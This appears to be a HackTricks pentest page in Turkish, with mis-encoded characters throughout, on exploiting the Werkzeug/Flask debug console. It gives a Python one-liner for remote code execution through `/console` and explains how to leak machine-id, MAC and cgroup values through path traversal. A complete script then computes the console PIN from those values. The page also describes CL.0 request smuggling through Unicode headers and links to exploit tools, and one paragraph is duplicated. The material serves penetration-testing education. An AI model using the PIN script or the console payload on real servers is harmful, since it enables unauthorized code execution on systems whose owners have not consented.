# Werkzeug / Flask Debug

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

**Zafiyet deÄŸerlendirmesi ve penetrasyon testi iÃ§in anÄ±nda kullanÄ±labilir kurulum**. Recon'dan raporlamaya kadar 20'den fazla araÃ§ ve Ã¶zellik ile her yerden tam bir pentest gerÃ§ekleÅŸtirin. Pentester'larÄ±n yerini almÄ±yoruz - onlara daha derinlemesine araÅŸtÄ±rma yapmalarÄ±, shell aÃ§malarÄ± ve eÄŸlenmeleri iÃ§in biraz zaman kazandÄ±rmak amacÄ±yla Ã¶zel araÃ§lar, tespit ve istismar modÃ¼lleri geliÅŸtiriyoruz.

{% embed url="https://pentest-tools.com/" %}

## Konsol RCE

EÄŸer debug aktifse `/console` eriÅŸmeyi deneyebilir ve RCE elde edebilirsiniz.
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (117).png>)

Ä°nternette [ÅŸu](https://github.com/its-arun/Werkzeug-Debug-RCE) gibi birkaÃ§ istismar da bulunmaktadÄ±r veya metasploit'te bir tane.

## Pin KorumasÄ± - Yol Traversali

BazÄ± durumlarda **`/console`** uÃ§ noktasÄ± bir pin ile korunacaktÄ±r. EÄŸer bir **dosya traversali aÃ§Ä±ÄŸÄ±** varsa, o pini oluÅŸturmak iÃ§in gerekli tÃ¼m bilgileri sÄ±zdÄ±rabilirsiniz.

### Werkzeug Konsol PIN Ä°stismarÄ±

Bunu gÃ¶rmek iÃ§in uygulamada bir hata sayfasÄ± zorlayÄ±n:
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
"console locked" senaryosuyla ilgili bir mesaj, Werkzeug'un hata ayÄ±klama arayÃ¼zÃ¼ne eriÅŸim saÄŸlanmaya Ã§alÄ±ÅŸÄ±ldÄ±ÄŸÄ±nda karÅŸÄ±laÅŸÄ±lÄ±r ve konsolu kilidini aÃ§mak iÃ§in bir PIN gerekliliÄŸini belirtir. Konsol PIN'ini istismar etmek iÃ§in, Werkzeug'un hata ayÄ±klama baÅŸlatma dosyasÄ±nda (`__init__.py`) PIN oluÅŸturma algoritmasÄ±nÄ± analiz etme Ã¶nerisi yapÄ±lmaktadÄ±r. PIN oluÅŸturma mekanizmasÄ±, [**Werkzeug kaynak kodu deposu**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/\_\_init\_\_.py) Ã¼zerinden incelenebilir, ancak potansiyel sÃ¼rÃ¼m farklÄ±lÄ±klarÄ± nedeniyle gerÃ§ek sunucu kodunun bir dosya geÃ§iÅŸ aÃ§Ä±ÄŸÄ± aracÄ±lÄ±ÄŸÄ±yla temin edilmesi tavsiye edilmektedir.

Konsol PIN'ini istismar etmek iÃ§in iki set deÄŸiÅŸken gereklidir: `probably_public_bits` ve `private_bits`:

#### **`probably_public_bits`**

* **`username`**: Flask oturumunu baÅŸlatan kullanÄ±cÄ±yÄ± ifade eder.
* **`modname`**: Genellikle `flask.app` olarak adlandÄ±rÄ±lÄ±r.
* **`getattr(app, '__name__', getattr(app.__class__, '__name__'))`**: Genellikle **Flask** olarak Ã§Ã¶zÃ¼lÃ¼r.
* **`getattr(mod, '__file__', None)`**: Flask dizinindeki `app.py`'nin tam yolunu temsil eder (Ã¶rneÄŸin, `/usr/local/lib/python3.5/dist-packages/flask/app.py`). EÄŸer `app.py` geÃ§erli deÄŸilse, **`app.pyc`** denemelisiniz.

#### **`private_bits`**

* **`uuid.getnode()`**: Mevcut makinenin MAC adresini alÄ±r, `str(uuid.getnode())` bunu ondalÄ±k formata Ã§evirir.
* **Sunucunun MAC adresini belirlemek iÃ§in**, uygulamanÄ±n kullandÄ±ÄŸÄ± aktif aÄŸ arayÃ¼zÃ¼nÃ¼ tanÄ±mlamak gerekir (Ã¶rneÄŸin, `ens3`). Belirsizlik durumunda, **`/proc/net/arp`** sÄ±zÄ±ntÄ±sÄ± yaparak cihaz kimliÄŸini bulabilir, ardÄ±ndan **`/sys/class/net/<device id>/address`**'den MAC adresini **Ã§Ä±karabilirsiniz**.
* Hexadecimal bir MAC adresinin ondalÄ±k formata dÃ¶nÃ¼ÅŸtÃ¼rÃ¼lmesi aÅŸaÄŸÄ±da gÃ¶sterildiÄŸi gibi yapÄ±labilir:

```python
# Ã–rnek MAC adresi: 56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```
* **`get_machine_id()`**: `/etc/machine-id` veya `/proc/sys/kernel/random/boot_id`'den verileri, `/proc/self/cgroup`'un sonundaki ilk satÄ±rla (`/`) birleÅŸtirir.

<details>

<summary>`get_machine_id()` iÃ§in kod</summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</details>

Gerekli tÃ¼m veriler toplandÄ±ktan sonra, exploit script'i Werkzeug konsol PIN'ini oluÅŸturmak iÃ§in Ã§alÄ±ÅŸtÄ±rÄ±labilir:

Gerekli tÃ¼m veriler toplandÄ±ktan sonra, exploit script'i Werkzeug konsol PIN'ini oluÅŸturmak iÃ§in Ã§alÄ±ÅŸtÄ±rÄ±labilir. Script, oluÅŸturulan `probably_public_bits` ve `private_bits`'i kullanarak bir hash oluÅŸturur, bu hash daha sonra nihai PIN'i Ã¼retmek iÃ§in ek iÅŸleme tabi tutulur. AÅŸaÄŸÄ±da bu sÃ¼reci gerÃ§ekleÅŸtiren Python kodu bulunmaktadÄ±r:
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',  # username
'flask.app',  # modname
'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
Bu script, birleÅŸtirilmiÅŸ bitleri hashleyerek, belirli tuzlar (`cookiesalt` ve `pinsalt`) ekleyerek ve Ã§Ä±ktÄ±yÄ± formatlayarak PIN'i Ã¼retir. `probably_public_bits` ve `private_bits` iÃ§in gerÃ§ek deÄŸerlerin hedef sistemden doÄŸru bir ÅŸekilde elde edilmesi gerektiÄŸini unutmamak Ã¶nemlidir, bÃ¶ylece Ã¼retilen PIN, Werkzeug konsolunun beklediÄŸi ile eÅŸleÅŸir.

{% hint style="success" %}
EÄŸer **eski bir sÃ¼rÃ¼m** Werkzeug kullanÄ±yorsanÄ±z, **hashing algoritmasÄ±nÄ± md5** olarak deÄŸiÅŸtirmeyi deneyin.
{% endhint %}

## Werkzeug Unicode karakterleri

[**bu sorun**](https://github.com/pallets/werkzeug/issues/2833)'da gÃ¶zlemlendiÄŸi gibi, Werkzeug baÅŸlÄ±klarda Unicode karakterleri ile bir isteÄŸi kapatmaz. Ve [**bu yazÄ±da**](https://mizu.re/post/twisty-python) aÃ§Ä±klandÄ±ÄŸÄ± gibi, bu bir CL.0 Request Smuggling zafiyetine neden olabilir.

Bu, Werkzeug'ta bazÄ± **Unicode** karakterlerin gÃ¶nderilmesinin mÃ¼mkÃ¼n olmasÄ± ve bunun sunucunun **Ã§Ã¶kmesine** neden olmasÄ±ndandÄ±r. Ancak, HTTP baÄŸlantÄ±sÄ± **`Connection: keep-alive`** baÅŸlÄ±ÄŸÄ± ile oluÅŸturulmuÅŸsa, isteÄŸin gÃ¶vdesi okunmayacak ve baÄŸlantÄ± hala aÃ§Ä±k kalacaktÄ±r, bu nedenle isteÄŸin **gÃ¶vdesi** bir sonraki **HTTP isteÄŸi** olarak iÅŸlenecektir.

## Otomatik SÃ¶mÃ¼rÃ¼

{% embed url="https://github.com/Ruulian/wconsole_extractor" %}

## Referanslar

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)
* [**https://github.com/pallets/werkzeug/issues/2833**](https://github.com/pallets/werkzeug/issues/2833)
* [**https://mizu.re/post/twisty-python**](https://mizu.re/post/twisty-python)

<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

**Zafiyet deÄŸerlendirmesi ve penetrasyon testi iÃ§in anÄ±nda kullanÄ±labilir kurulum**. 20'den fazla araÃ§ ve Ã¶zellik ile her yerden tam bir pentest gerÃ§ekleÅŸtirin; bu araÃ§lar keÅŸiften raporlamaya kadar uzanÄ±r. Pentester'larÄ±n yerini almÄ±yoruz - onlara daha derinlemesine araÅŸtÄ±rma yapmalarÄ±, shell'leri patlatmalarÄ± ve eÄŸlenmeleri iÃ§in biraz zaman kazandÄ±rmak amacÄ±yla Ã¶zel araÃ§lar, tespit ve sÃ¶mÃ¼rÃ¼ modÃ¼lleri geliÅŸtiriyoruz.

{% embed url="https://pentest-tools.com/" %}

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
